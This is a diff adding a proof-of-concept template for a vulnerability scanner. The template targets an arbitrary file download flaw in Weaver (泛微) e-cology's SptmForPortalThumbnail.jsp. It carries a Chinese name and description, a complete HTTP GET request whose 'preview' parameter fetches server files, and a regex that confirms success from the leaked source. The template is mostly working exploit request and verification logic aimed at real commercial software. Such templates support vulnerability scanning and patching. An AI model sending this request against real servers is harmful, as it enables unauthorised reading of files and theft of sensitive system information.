@@ -1,0 +1,14 @@
+﻿<DudePoc_Name>泛微 e-cology SptmForPortalThumbnail.jsp 存在任意文件下载漏洞</DudePoc_Name>
+<DudePoc_Description>上海泛微网络科技股份有限公司e-cology SptmForPortalThumbnail.jsp 存在任意文件下载漏洞，攻击者可利用该漏洞获取系统敏感信息。</DudePoc_Description>
+<DudePoc_SetHeader>
+GET /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp HTTP/1.1
+Host: $<AttackHost>$
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?java.io)(?=.*?imgFile.exists)(?=.*?Thumbnail).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
